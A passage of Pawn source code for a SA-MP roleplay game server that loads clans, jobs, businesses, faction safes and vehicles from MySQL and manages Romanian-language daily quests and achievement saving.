	strcat(ClanInfo[0][clColor], "FFFFFF");
	ClanInfo[0][clColorInt] = 0xFFFFFFFF;
 	for(new i; i != sql_clans; i++) {
	    cache_get_value_name_int(i, "ID", x);
       	cache_get_value_name(i, "Owner", ClanInfo[x][clOwner]);

       	cache_get_value_name(i, "Name", ClanInfo[x][clName]);
     	cache_get_value_name(i, "Motd", ClanInfo[x][clMotd]);
      	cache_get_value_name(i, "Tag", ClanInfo[x][clTag]);

       	cache_get_value_name(i, "RankName1", ClanInfo[x][clRankName1]);
       	cache_get_value_name(i, "RankName2", ClanInfo[x][clRankName2]);
       	cache_get_value_name(i, "RankName3", ClanInfo[x][clRankName3]);
      	cache_get_value_name(i, "RankName4", ClanInfo[x][clRankName4]);
     	cache_get_value_name(i, "RankName5", ClanInfo[x][clRankName5]);
      	cache_get_value_name(i, "RankName6", ClanInfo[x][clRankName6]);
      	cache_get_value_name(i, "RankName7", ClanInfo[x][clRankName7]);
      	ClanInfo[x][cID] = x;

      	ClanID[i] = x;
		
      	cache_get_value_name(i, "Color", ClanInfo[x][clColor]); 
      	cache_get_value_name_int(i, "Slots", ClanInfo[x][clSlots]);
      	cache_get_value_name_int(i, "Bonus", ClanInfo[x][clBonus]);
      	cache_get_value_name_int(i, "Safebox", ClanInfo[x][ClanBank]);
      	cache_get_value_name_int(i, "HQ", ClanInfo[x][clHQ]);				
      	cache_get_value_name_int(i, "PremiumPoints", ClanInfo[x][clPremiumPoints]);
		cache_get_value_name_int(i, "Days", ClanInfo[x][clDays]);		
		cache_get_value_name_int(i, "Premium", ClanInfo[x][clPremium]);		
		cache_get_value_name_int(i, "VIP", ClanInfo[x][clVip]);			
		cache_get_value_name(i, "RegisterDate", ClanInfo[x][clRegisterDate]);
		strmid(color, ClanInfo[x][clColor], 0, 8), strcat(color, "AA", 10);
		ClanInfo[x][clColorInt] = HexToInt(color);

		mysql_format(SQL, gQuery, 128, "SELECT * FROM `clanvehicle` WHERE `ClanID`='%i' LIMIT 10", x);
		mysql_tquery(SQL, gQuery, "SQL_LoadClanVehicles", "i", x);

		mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Clan`='%d'", x);
		mysql_tquery(SQL, gQuery, "GClanMemberss", "i", x);
	}
	printf("[MySQL]\t\t\tclans\t\t\t%d", sql_clans);
	return true;
}
redist::LoadJobs() {
	sql_jobs = cache_num_rows();
	if(!sql_jobs) return true;
	new jPos[50], wPos[50]; gString[0] = EOS;
 	for(new x=1;x<=sql_jobs;x++) {
       	cache_get_value_name_int(x-1, "ID", JobInfo[x][jID]);	
       	cache_get_value_name(x-1, "Name", JobInfo[x][jName]); 		
       	cache_get_value_name(x-1, "Description", JobInfo[x][jDescription]);
     	cache_get_value_name_int(x-1, "NeedLevel", JobInfo[x][jLevel]); 				
      	cache_get_value_name_int(x-1, "Legal", JobInfo[x][jLegal]); 			
      	cache_get_value_name_int(x-1, "Skill1Veh", JobInfo[x][jSkill1Veh]); 
      	cache_get_value_name_int(x-1, "Skill2Veh", JobInfo[x][jSkill2Veh]); 
		cache_get_value_name_int(x-1, "Skill3Veh", JobInfo[x][jSkill3Veh]); 
		cache_get_value_name_int(x-1, "Skill4Veh", JobInfo[x][jSkill4Veh]); 
		cache_get_value_name_int(x-1, "Skill5Veh", JobInfo[x][jSkill5Veh]); 
		cache_get_value_name_int(x-1, "Skill6Veh", JobInfo[x][jSkill6Veh]);
		cache_get_value_name_int(x-1, "Skill6Veh", JobInfo[x][jSkill7Veh]);  
		cache_get_value_name_int(x-1, "Balance", JobInfo[x][jBalance]);
		cache_get_value_name(x-1, "Owner", JobInfo[x][jOwner]);
		cache_get_value_name(x-1, "Pos", jPos);
		cache_get_value_name(x-1, "WorkPos", wPos);

		sscanf(jPos, "p<,>fff", JobInfo[x][jPosX], JobInfo[x][jPosY], JobInfo[x][jPosZ]);
		sscanf(wPos, "p<,>fff", JobInfo[x][jWPosX], JobInfo[x][jWPosY], JobInfo[x][jWPosZ]);

		format(gString, 256, "ID: {018C0D}%d\n{018C0D}%s\n{FFFFFF}Job: {018C0D}%s\n{FFFFFF}Level: {018C0D}%d\n{FFFFFF}Owner: {018C0D}%s\n{FFFFFF}Press {018C0D}Y{FFFFFF} to get job.\nPress {018C0D}N{FFFFFF} to quit job.", x, JobInfo[x][jDescription], JobInfo[x][jName], JobInfo[x][jLevel], JobInfo[x][jOwner]);
		JobInfo[x][jLabel] = CreateDynamic3DTextLabel(gString, -1, JobInfo[x][jPosX], JobInfo[x][jPosY], JobInfo[x][jPosZ], 25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 20.0);
		JobInfo[x][jPickup] = CreateDynamicPickup(1275, 23, JobInfo[x][jPosX], JobInfo[x][jPosY], JobInfo[x][jPosZ], -1, -1, -1, 100.0);
		PickupInfo[JobInfo[x][jPickup]][pkID] = x;
		PickupInfo[JobInfo[x][jPickup]][pkType] = 5;

		if !strcmp(JobInfo[x][jOwner], "None", true) *then JobInfo[x][jOwner][0] = (EOS), strmid(JobInfo[x][jOwner], "{FF0000}-{FFFFFF}", 0, 20);

		switch(JobInfo[x][jID]) {
			case 8: continue;
			case 11,13,16: {
				CreateDynamicMapIcon(JobInfo[x][jPosX], JobInfo[x][jPosY], JobInfo[x][jPosZ], 9, -1);
				continue;
			}
		}
		if(JobInfo[x][jID] == 8 || JobInfo[x][jID] == 11 || JobInfo[x][jID] == 13 || JobInfo[x][jID] >= 15) continue;
		format(gString, 256, "{BD0000}Work Place\n{FFFFFF}Job '%s'\n(use {BD0000}/work{FFFFFF})", JobInfo[x][jName]);
		CreateDynamic3DTextLabel(gString, -1, JobInfo[x][jWPosX], JobInfo[x][jWPosY], JobInfo[x][jWPosZ], 10.0);
		CreateDynamicPickup(19130, 23, JobInfo[x][jWPosX], JobInfo[x][jWPosY], JobInfo[x][jWPosZ]);
	}
	printf("[MySQL]\t\t\tjobs\t\t\t%d", sql_jobs);
	return true;
}

redist::LoadBizz() {
	bussines = cache_num_rows();
    for(new x = 1; x <= bussines; x++) {
    	new idd = x - 1;
    	cache_get_value_name(idd, "Owner", BizzInfo[x][bOwner]);
        cache_get_value_name(idd, "Message", BizzInfo[x][bMessage]);
		cache_get_value_name_int(idd, "ID", BizzInfo[x][bID]);			
        cache_get_value_name_int(idd, "Owned", BizzInfo[x][bOwned]);
   	    cache_get_value_name_float(idd, "EntranceX", BizzInfo[x][bEntranceX]);		
   	    cache_get_value_name_float(idd, "EntranceY", BizzInfo[x][bEntranceY]);		
   	    cache_get_value_name_float(idd, "EntranceZ", BizzInfo[x][bEntranceZ]);		
   	    cache_get_value_name_float(idd, "ExitX", BizzInfo[x][bExitX]);			
   	    cache_get_value_name_float(idd, "ExitY", BizzInfo[x][bExitY]);			
   	    cache_get_value_name_float(idd, "ExitZ", BizzInfo[x][bExitZ]);			
   	    cache_get_value_name_int(idd, "LevelNeeded", BizzInfo[x][bLevel]); 		
   	    cache_get_value_name_int(idd, "BuyPrice", BizzInfo[x][bBuyPrice]); 		
   	    cache_get_value_name_int(idd, "EntranceCost", BizzInfo[x][bFee]); 			
   	    cache_get_value_name_int(idd, "Till", BizzInfo[x][bBalance]);		
   	   	cache_get_value_name_int(idd, "Locked", BizzInfo[x][bLocked]); 		
   	    cache_get_value_name_int(idd, "Interior", BizzInfo[x][bInterior]); 		
   	    cache_get_value_name_int(idd, "Virtual", BizzInfo[x][bVirtual]); 		
 		cache_get_value_name_int(idd, "Radio", BizzInfo[x][bRadio]);		
 		cache_get_value_name_int(idd, "Static", BizzInfo[x][bStatic]); 		
 		cache_get_value_name_int(idd, "Gas", BizzInfo[x][bGas]);			
 		cache_get_value_name_int(idd, "Type", BizzInfo[x][bType]);	

 		switch(BizzInfo[x][bType]) {
			case 15: BizzInfo[x][bPickup] = CreateDynamicPickup(1254, 23, BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ]);
			case 17: BizzInfo[x][bPickup] = CreateDynamicPickup(19134, 23, BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ]);
			case 18: BizzInfo[x][bPickup] = CreateDynamicPickup(1318, 23, BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ]+1.0);
			default: BizzInfo[x][bPickup] = CreateDynamicPickup(1239, 23, BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ]);
		}
		UpdateLabel(2,BizzInfo[x][bID]);	
		LoadGPS(BizzInfo[x][bType], x);
		PickupInfo[BizzInfo[x][bPickup]][pkID] = x;
		PickupInfo[BizzInfo[x][bPickup]][pkType] = 2;

	    switch(BizzInfo[x][bType]) {
	        case 1: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],52,0,-1,0,-1,500.0); // banca
	        case 2: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],6,0,-1,0,-1,500.0); // gun shop
	        case 3: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],49,0,-1,0,-1,500.0); // club
	        case 4: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],50,0,-1,0,-1,500.0); // restaurant
	        case 5: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],38,0,-1,0,-1,500.0); // sexshop
	        case 6: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],17,0,-1,0,-1,500.0); // 24/7
	        case 7: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],45,0,-1,0,-1,500.0); // binco
	        case 8: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],10,0,-1,0,-1,500.0); // burger
	        case 9: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],25,0,-1,0,-1,500.0); // casino
	        case 10: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],16,0,-1,0,-1,500.0); // cnn
	        case 12: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],55,0,-1,0,-1,500.0); // car
	        case 13: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],54,0,-1,0,-1,500.0); // GYM
	        case 14: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],63,0,-1,0,-1,500.0); // car color
	        case 15: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],23,0,-1,0,-1,500.0); // paintball
	        case 16: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],27,0,-1,0,-1,500.0); // gas station
	        case 17: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],53,0,-1,0,-1,500.0); // race
	        case 18: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],63,0,-1,0,-1,500.0); // pns
	        case 19: CreateDynamicMapIcon(BizzInfo[x][bEntranceX], BizzInfo[x][bEntranceY], BizzInfo[x][bEntranceZ],29,0,-1,0,-1,500.0); // pizza
	    }		
	}
	printf("[MySQL]\t\t\tbusiness\t\t%d", bussines);
	return true;
}
LoadGPS(type, x) {
	type--;
	BizzTypeID[type][GpsBizzType[type]] = x, GpsBizzType[type] ++;
}

stock SaveSeif(const id) {
	_query("UPDATE `seif` SET `sMoney` = '%d', `sDrugs` = '%d', `sMaterials` = '%d' WHERE `sID` = '%d'", SafeInfo[id][sMoney], SafeInfo[id][sDrugs], SafeInfo[id][sMaterials], SafeInfo[id][sID]);
	return true;
}
redist::LoadSafes() {	
	printf("[MySQL]\t\t\tfactions safes\t\t%d", cache_num_rows());
	if(cache_num_rows() == 0)
		return true;

	gString[0] = EOS;
 	for(new i = 0; i < cache_num_rows(); i++) {			
 		cache_get_value_name_int(i, "sID", SafeInfo[i][sID]); 
       	cache_get_value_name_int(i, "sFactionID", SafeInfo[i][sFactionID]); 
     	cache_get_value_name_float(i, "sPosX", SafeInfo[i][sPosX]); 		
      	cache_get_value_name_float(i, "sPosY", SafeInfo[i][sPosY]); 		
       	cache_get_value_name_float(i, "sPosZ", SafeInfo[i][sPosZ]); 		
       	cache_get_value_name_int(i, "sMoney", SafeInfo[i][sMoney]); 		
       	cache_get_value_name_int(i, "sDrugs", SafeInfo[i][sDrugs]); 		
      	cache_get_value_name_int(i, "sMaterials", SafeInfo[i][sMaterials]); 
     	cache_get_value_name_int(i, "sVirtualID", SafeInfo[i][sVirtualID]); 

		format(gString, 100, "%s's Safe Box\nUse ({039800}/fdeposit{FFFFFF})", FactionName(i+1));
	    CreateDynamic3DTextLabel(gString, -1, SafeInfo[i][sPosX], SafeInfo[i][sPosY], SafeInfo[i][sPosZ], 100, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, SafeInfo[i][sVirtualID]);
	}
	return true;
}
redist::LoadHQClans() {
	clanhqid = cache_num_rows();
	printf("[MySQL]\t\t\tclans HQ\t\t%d", clanhqid);
 	for(new x = 1; x <= clanhqid; x++) {
 		new i = x - 1;
        cache_get_value_name_int(i, "ID", ClanHQInfo[x][cID]);				
       	cache_get_value_name_float(i, "PosX", ClanHQInfo[x][cPosX]);			
       	cache_get_value_name_float(i, "PosY", ClanHQInfo[x][cPosY]);			
       	cache_get_value_name_float(i, "PosZ", ClanHQInfo[x][cPosZ]);			
       	cache_get_value_name_float(i, "EnterX", ClanHQInfo[x][cEnterX]);			
       	cache_get_value_name_float(i, "EnterY", ClanHQInfo[x][cEnterY]);			
       	cache_get_value_name_float(i, "EnterZ", ClanHQInfo[x][cEnterZ]);		
       	cache_get_value_name_int(i, "Price", ClanHQInfo[x][cPrice]);			
       	cache_get_value_name_int(i, "Clan", ClanHQInfo[x][cClan]);		
       	cache_get_value_name_int(i, "Status", ClanHQInfo[x][cStatus]);		
       	cache_get_value_name_int(i, "VirtualWorld", ClanHQInfo[x][cVirtualWorld]);		
       	UpdateLabel(4, x);	
	}
	return true;
}

redist::LoadSVehicle() {
	new servervehs = cache_num_rows();
	for(new x = 1; x <= servervehs; x++) {
		new i = x - 1;
       	cache_get_value_name_int(i, "vID", ServerVehicles[x][vID]);			
       	cache_get_value_name_int(i, "vModel", ServerVehicles[x][vModel]);		
     	cache_get_value_name_float(i, "LocationX", ServerVehicles[x][vLocation][0]);	
     	cache_get_value_name_float(i, "LocationY", ServerVehicles[x][vLocation][1]);	
     	cache_get_value_name_float(i, "LocationZ", ServerVehicles[x][vLocation][2]);	
       	cache_get_value_name_float(i, "Angle", ServerVehicles[x][vAngle]);
       	cache_get_value_name_int(i, "Color1", ServerVehicles[x][vColor][0]);	
       	cache_get_value_name_int(i, "Color2", ServerVehicles[x][vColor][1]);
       	cache_get_value_name_int(i, "Faction", ServerVehicles[x][vFaction]);		
       	cache_get_value_name_int(i, "Rank", ServerVehicles[x][vRank]);		

		if(ServerVehicles[x][vModel] >= 400 && ServerVehicles[x][vModel] <= 611) {
			ServerVehicles[x][vSpawned] = CreateVehicleEx(ServerVehicles[x][vModel], ServerVehicles[x][vLocation][0], ServerVehicles[x][vLocation][1], ServerVehicles[x][vLocation][2], ServerVehicles[x][vAngle], ServerVehicles[x][vColor][0], ServerVehicles[x][vColor][1], ServerVehicles[x][vModel]!=510?-1:300);
			if(is_mafiot_vehicle(x)!=-1) Iter_Add(FactionVehicle<is_mafiot_vehicle(x)>, ServerVehicles[x][vSpawned]);
			new idd = ServerVehicles[x][vSpawned], str[64];
			if(ServerVehicles[idd][vFaction] != 0) format(str, 64, "F%d %d", ServerVehicles[idd][vFaction], idd);
			else format(str, sizeof(str), "RO-0%d", ServerVehicles[x][vSpawned]);
			SetVehicleNumberPlate(idd, str);
		}
	}
	print(" "),print(" "),print(" "),print(" "),print(" "),print(" "),print(" ");
	print("--------------------------- Starting ---------------------------");
	print("Type\t\t\tName\t\t\tAmount"); print(" ");
	printf("[MySQL]\t\t\tvehicles\t\t%d", servervehs);
	return true;
}

redist::ResetGates() {
	GateStatus = 0;
	MoveDynamicObject(ttcgate[0], 2423.84619, -2083.33496, 15.34760, 3.0);
	MoveDynamicObject(ttcgate[1], 2423.84619, -2094.83081, 15.34760, 3.0);
	return true;
}
redist::ResetGates1() {
	GateStatus = 0;
	MoveDynamicObject(ttcgate[2], -2430.014404, 498.113434, 28.617100, 3.0, 0.000000, 0.000000, 204.119980);
	return true;
}
redist::HideDeathMessage() {
	foreach(new i : Staff<ADMIN>) for(new x = 0; x < 5; x++) SendDeathMessageToPlayer(i, 1001, 1001, 200);
	if(TipLicitatie) SCMTA(COLOR_YELLOW, "In acest moment este o licitatie activa. Pentru mai multe detalii, foloseste comanda /info.");
	return true;
}

cmd:restartmissions(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) return true;
	ResetQuest();
	return true;
}
redist::GetNeedProgress(playerid, caz) {
	return PlayerInfo[playerid][pNeedProgress][caz];
}
stock missionName(playerid, type, id) {
	gString[0] = (EOS);
	switch(type) {
		case 0: format(gString, 60, "Omoara %d jucatori la arena de paintball", PlayerInfo[playerid][pNeedProgress][id]);
		case 1: format(gString, 60, "Livreaza %d cutii cu pizza", PlayerInfo[playerid][pNeedProgress][id]);
		case 2: format(gString, 60, "Colecteaza gunoiul din %d cosuri de gunoi", PlayerInfo[playerid][pNeedProgress][id]);
		case 3: format(gString, 60, "Vinde %d saci cu faina", PlayerInfo[playerid][pNeedProgress][id]);
		case 4: strcat(gString, "Mergi intr-un club si imbata-te");	
		case 5: strcat(gString, "Deschide un crate");
		case 6: strcat(gString, "Localizeaza un player");		
		case 7: strcat(gString, "Drogheaza-te");	
		case 8: strcat(gString, "Cumpara o cafea dintr-un bar");	
		case 9: {
			switch(PlayerInfo[playerid][pMember]) {
				case 1,2,3,14,19: format(gString, 60, "Aresteaza %d suspecti", PlayerInfo[playerid][pNeedProgress][id]);
				case 7,16,21: format(gString, 60, "Ofera %d licente", PlayerInfo[playerid][pNeedProgress][id]);
				case 8,22: format(gString, 60, "Tracteaza %d vehicule", PlayerInfo[playerid][pNeedProgress][id]);
				case 9: format(gString, 60, "Da %d anunturi", PlayerInfo[playerid][pNeedProgress][id]);
				case 11: format(gString, 60, "Finalizeaza %d contracte", PlayerInfo[playerid][pNeedProgress][id]);
				case 12,15,23: format(gString, 60, "Transporta %d playeri la destinatia dorita", PlayerInfo[playerid][pNeedProgress][id]);
				case 13,20: format(gString, 60, "Ofera viata la %d playeri", PlayerInfo[playerid][pNeedProgress][id]);
				default: format(gString, 60, "Prinde %d pesti", PlayerInfo[playerid][pNeedProgress][id]);
			}
		}
		case 10: format(gString, 60, "Plaseaza %d contracte", PlayerInfo[playerid][pNeedProgress][id]);	
		case 11: format(gString, 60, "Repara vehiculul de %d intr-un PNS", PlayerInfo[playerid][pNeedProgress][id]);
		case 12: strcat(gString, "Castiga la barbut (/dice)");
		case 13: strcat(gString, "Vinde o arma unui jucator");
		case 14: strcat(gString, "Viziteaza muntele Chilliad");
		case 15: strcat(gString, "Viziteaza Area 51");
		case 16: strcat(gString, "Viziteaza insula din Las Venturas");
		case 17: format(gString, 60, "Livreaza %d vehicule cu materiale", PlayerInfo[playerid][pNeedProgress][id]);
		case 18: strcat(gString, "Sari cu parasuta dintr-un avion/elicopter");	
		case 19: strcat(gString, "Cumpara un nou stil de lupta");	
		case 20: strcat(gString, "Cumpara o perechere de ochelari de la un biz de tip 'Clothes'");	
		case 21: strcat(gString, "Cumpara o palarie de la un biz de tip 'Clothes'");	
		case 22: strcat(gString, "Adauga un anunt (/ad)");
		case 23: strcat(gString, "Jefuieste un business");
		case 24: strcat(gString, "Viziteaza cartierul Grove Street");
		case 25: strcat(gString, "Viziteaza locatia 'Bayside'");
		case 26: strcat(gString, "Viziteaza locatia 'Angel Pine'");
		case 27: strcat(gString, "Viziteaza locatia 'Flint County'");
		case 28: strcat(gString, "Viziteaza locatia 'Fern Ridge'");
		case 29: strcat(gString, "Viziteaza locatia 'Montgomery'");
		case 30: strcat(gString, "Viziteaza locatia 'Docks'");
		case 31: strcat(gString, "Viziteaza locatia 'Acro del Queste'");
		case 32: strcat(gString, "Viziteaza locatia 'Aeroport Parasit'");
		case 33: strcat(gString, "Viziteaza locatia 'Fort Carson'");
		case 34: strcat(gString, "Viziteaza locatia 'North Rock'");
		case 35: format(gString, 60, "Lucreaza de %d ori la job-ul 'Forklift'", PlayerInfo[playerid][pNeedProgress][id]);
		case 36: format(gString, 60, "Lucreaza de %d ori la job-ul 'Courier'", PlayerInfo[playerid][pNeedProgress][id]);
		case 37: format(gString, 60, "Cumpara %d burgeri dintr-un biz de tip 'Burger'", PlayerInfo[playerid][pNeedProgress][id]);
		case 38: format(gString, 60, "Cumpara %d pizza dintr-un biz de tip 'Pizza'", PlayerInfo[playerid][pNeedProgress][id]);
		case 39: format(gString, 60, "Cumpara %d Tuna/Soup/Steak dintr-un biz de tip 'Restaurant'", PlayerInfo[playerid][pNeedProgress][id]);
		case 40: format(gString, 60, "Mananca %d burgeri folosind comanda [/eat]", PlayerInfo[playerid][pNeedProgress][id]);
		case 41: format(gString, 60, "Mananca %d pizza folosind comanda [/eat]", PlayerInfo[playerid][pNeedProgress][id]);
		case 42: format(gString, 60, "Mananca %d Tuna/Soup/Steak folosind comanda [/eat]", PlayerInfo[playerid][pNeedProgress][id]);
		case 43: format(gString, 60, "Mananca de %d ori de la 'Eat stand (/eat)'", PlayerInfo[playerid][pNeedProgress][id]);
	}
	return gString;
}
redist::GiveQuest(playerid) {
	for(new id=0;id<5;id++) {
		PlayerInfo[playerid][pDailyMission][id] = RandomEx(14*id, 14*(id+1))%43;
		switch(PlayerInfo[playerid][pDailyMission][id]) {
			case 0..3: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(2, 5);
			case 4..8: PlayerInfo[playerid][pNeedProgress][id] = 1;
			case 9: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(2, 5);
			case 10: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(1, 5);
			case 11: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(1, 5);
			case 12..16: PlayerInfo[playerid][pNeedProgress][id] = 1;
			case 17: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(1, 2);
			case 18..34: PlayerInfo[playerid][pNeedProgress][id] = 1;
			case 35..42: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(2, 3);
			case 43: PlayerInfo[playerid][pNeedProgress][id] = RandomEx(3, 7);
		}
		PlayerInfo[playerid][pProgress][id] = 0;
	}
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `NeedProgress1`='%i', `NeedProgress2`='%i', `NeedProgress3`='%i', `NeedProgress4`='%i', `NeedProgress5`='%i', `DailyMission1` = '%i', `DailyMission2` = '%i', `DailyMission3` = '%i', `DailyMission4` = '%i', `DailyMission5` = '%i' WHERE `ID`='%i'", PlayerInfo[playerid][pNeedProgress][0], PlayerInfo[playerid][pNeedProgress][1], PlayerInfo[playerid][pNeedProgress][2], PlayerInfo[playerid][pNeedProgress][3], PlayerInfo[playerid][pNeedProgress][4], PlayerInfo[playerid][pDailyMission][0], PlayerInfo[playerid][pDailyMission][1], PlayerInfo[playerid][pDailyMission][2], PlayerInfo[playerid][pDailyMission][3], PlayerInfo[playerid][pDailyMission][4], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
	return true;
}
redist::ResetQuest() {
	mysql_tquery(SQL, "UPDATE `users` SET `DailyMission1`='-1', `Progress1`='0', `DailyMission2`='-1', `Progress2`='0', `DailyMission3`='-1', `Progress3`='0', `NeedProgress1`='0', `NeedProgress2`='0', `NeedProgress3`='0', `DailyMission3`='-1', `DailyMission4`='-1', `Progress4`='0', `Progress5`='0', `NeedProgress4`='0', `NeedProgress5`='0'");
    foreach(new i : logged_players) {
		GiveQuest(i);
		SendClientMessage(i, COLOR_YELLOW, "* Misiunea zilei a fost resetata. Foloseste /quests pentru a vedea noile misiuni!");
    }
	return true;
}
stock DestroyProgress(playerid, bar) {
	HidePlayerProgressBar(playerid, HudProgress[playerid][bar]);
	PlayerTextDrawHide(playerid, HudTD[bar]);
	return 1;
}
stock CheckMission(playerid, id) {
	for(new i=0;i<3;i++) {
		if(id!=PlayerInfo[playerid][pDailyMission][i]||PlayerInfo[playerid][pDailyMission][i]==-2) continue;
		new money = 50000 + PlayerInfo[playerid][pLevel] * 10000 + random(50000);
		SCMf(playerid, COLOR_GREY, "----- Daily Mission #%d -----", i+1);	
		SCMf(playerid, -1, "{FF9736}Mission: {FFFFFF} %s", missionName(playerid, PlayerInfo[playerid][pDailyMission][i], i));
		PlayerInfo[playerid][pProgress][i] ++;	
		if(PlayerInfo[playerid][pProgress][i] == PlayerInfo[playerid][pNeedProgress][i]) {
			if(random(100) > 50) {
				SCMf(playerid, -1, "{FF9736}Reward: {FFFFFF} +$%s, 1x Respect Point & 1x Premium Point.", FormatNumber(money));
				PlayerInfo[playerid][pPremiumPoints] ++;
				UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			} else SCMf(playerid, -1, "{FF9736}Reward: {FFFFFF} +$%s & 1x Respect Point.", FormatNumber(money));
			PlayerInfo[playerid][pDailyMission][i] = -2;
			gString[0] = (EOS);
			format(gString, 50, "DailyMission%d", i+1), UpdateVar(playerid, gString, -2);
			PlayerInfo[playerid][pExp] ++;
			UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
			GivePlayerCash(playerid, money);
			UpdateProgress(playerid, 0);
			givePetPoint(playerid, 100);
			givePoints(playerid, 10, RandomEx(10, 20));
		}
		else if(PlayerInfo[playerid][pProgress][i] < PlayerInfo[playerid][pNeedProgress][i]) SCMf(playerid, -1, "{FF9736}Mission Progress: {FFFFFF} %d/%d.", PlayerInfo[playerid][pProgress][i], PlayerInfo[playerid][pNeedProgress][i]);
	    gQuery[0] = (EOS);
	    mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Progress%d`='%d' WHERE `ID`='%d'", i+1, PlayerInfo[playerid][pProgress][i], PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gQuery);	
		SendClientMessage(playerid, COLOR_GREY, "-------------------------------");	
	}
	if(PlayerInfo[playerid][pDailyMission][0] && PlayerInfo[playerid][pDailyMission][1] && PlayerInfo[playerid][pDailyMission][2] == -2) {
		PlayerInfo[playerid][pCrates][1] ++;
    	save_crates(playerid);
    	SendClientMessage(playerid, COLOR_YELLOW, "Ai primit 1 Epic Crate deoarece ai terminat toate misiunile zilnice de astazi!");
		return true;
	}
	return true;
}
cmd:quests(playerid) {
	for(new i=0;i<3;i++) if(PlayerInfo[playerid][pProgress][i] >= GetNeedProgress(playerid, i) || PlayerInfo[playerid][pDailyMission][i] == -2) va_SendClientMessage(playerid, COLOR_YELLOW, "Mission #%d: %s (progres: %d/%d)", i+1, missionName(playerid, PlayerInfo[playerid][pDailyMission][i], i), PlayerInfo[playerid][pProgress][i], GetNeedProgress(playerid, i));
	return true;
}

redist::SaveAchievements(playerid) {
	format(gQuery, sizeof gQuery,
		"UPDATE `users` SET `AchievementStatus`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %d' WHERE `ID`='%d'", 
		PlayerInfo[playerid][pAchievementStatus][0], PlayerInfo[playerid][pAchievementStatus][1], PlayerInfo[playerid][pAchievementStatus][2], PlayerInfo[playerid][pAchievementStatus][3], PlayerInfo[playerid][pAchievementStatus][4],
		PlayerInfo[playerid][pAchievementStatus][5], PlayerInfo[playerid][pAchievementStatus][6], PlayerInfo[playerid][pAchievementStatus][7], PlayerInfo[playerid][pAchievementStatus][8], PlayerInfo[playerid][pAchievementStatus][9],
		PlayerInfo[playerid][pAchievementStatus][10], PlayerInfo[playerid][pAchievementStatus][11], PlayerInfo[playerid][pAchievementStatus][12], PlayerInfo[playerid][pAchievementStatus][13], PlayerInfo[playerid][pAchievementStatus][14],
		PlayerInfo[playerid][pAchievementStatus][15], PlayerInfo[playerid][pAchievementStatus][16], PlayerInfo[playerid][pAchievementStatus][17], PlayerInfo[playerid][pAchievementStatus][18], PlayerInfo[playerid][pAchievementStatus][19],		
		PlayerInfo[playerid][pAchievementStatus][20], PlayerInfo[playerid][pAchievementStatus][21], PlayerInfo[playerid][pAchievementStatus][22], PlayerInfo[playerid][pAchievementStatus][23], PlayerInfo[playerid][pAchievementStatus][24],
		PlayerInfo[playerid][pAchievementStatus][25], PlayerInfo[playerid][pAchievementStatus][26], PlayerInfo[playerid][pAchievementStatus][27], PlayerInfo[playerid][pAchievementStatus][28], PlayerInfo[playerid][pAchievementStatus][29],	
